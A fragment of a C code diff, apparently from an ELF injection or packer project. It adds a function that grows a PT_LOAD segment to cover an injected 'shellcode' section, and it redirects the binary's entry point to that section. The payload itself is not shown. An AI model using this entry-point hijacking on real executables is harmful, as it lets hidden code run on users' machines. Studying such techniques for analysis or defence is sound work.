@@ -211,6 +211,27 @@ Elf64_Addr find_next_virtual_address(void *map)
     return aligned_addr;
 }
 
+void	update_phdr(void *map, Elf64_Ehdr *ehdr, Elf64_Shdr *new_shdr)
+{
+	Elf64_Phdr *phdr = (Elf64_Phdr *)(map + ehdr->e_phoff);
+    
+    // Find a PT_LOAD segment
+    for (int i = 0; i < ehdr->e_phnum; i++) 
+	{
+        if (phdr[i].p_type == PT_LOAD) 
+		{
+            // Modify the first PT_LOAD segment to include the new section if possible
+            if (phdr[i].p_vaddr + phdr[i].p_memsz < new_shdr->sh_addr) 
+			{
+                // Add the shellcode section to the segment found
+                phdr[i].p_memsz += new_shdr->sh_size;
+                phdr[i].p_filesz += new_shdr->sh_size;
+            }
+            break;
+        }
+    }
+}
+
 void	inject_new_header(void *map)
 {
 	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;
@@ -237,7 +258,9 @@ void	inject_new_header(void *map)
 	new_shdr->sh_size = sizeof(shellcode);
 	new_shdr->sh_addralign = 0x10;
 	ehdr->e_shnum += 1;
+	ehdr->e_entry = new_shdr->sh_addr;
 
+	update_phdr(map, ehdr, new_shdr);
 }
 
 int main(void)
